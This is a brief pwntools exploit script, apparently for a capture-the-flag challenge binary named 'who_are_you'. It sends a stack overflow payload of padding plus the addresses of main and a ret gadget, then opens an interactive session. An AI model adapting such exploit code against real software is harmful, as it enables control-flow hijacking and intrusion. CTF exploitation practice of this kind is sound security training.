from pwn import *
p = process("./who_are_you")
pause()
elf = ELF("./who_are_you")
libc = elf.libc
main = 0x401335
ret =0x401016
payload = "a" * 20
payload += p64(main)
payload += p64(ret)
p.sendline(payload)
p.interactive()
